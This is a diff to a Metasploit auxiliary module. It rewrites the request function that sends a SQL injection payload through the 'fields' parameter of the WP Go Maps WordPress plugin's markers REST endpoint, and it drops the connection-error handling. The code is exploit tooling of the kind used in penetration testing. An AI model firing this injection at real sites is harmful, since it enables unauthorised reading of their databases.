@@ -37,25 +37,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def send_sql_request(sql_query)
+    res = send_request_cgi(
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path),
+      'vars_get' => {
+        'rest_route' => '/wpgmza/v1/markers',
+        'filter' => '{}',
+        'fields' => "#{sql_query}-- -",
+      }
+    )
 
-    begin
-      res = send_request_cgi(
-        'method'   => 'GET',
-        'uri'      => normalize_uri(target_uri.path, '/wp-json/wpgmza/v1/markers/'),
-        'vars_get' => {
-          'filter' => '{}',
-          'fields' => "#{sql_query}-- -",
-        }
-      )
-
-      return nil if res.nil? || res.code != 200 || res.body.nil?
-
-      res.body
-
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE => e
-      vprint_error("#{peer} - The host was unreachable!")
-      return nil
-    end
+    return nil if res.nil? || res.code != 200 || res.body.nil?
+    res.body
   end
 
   def check
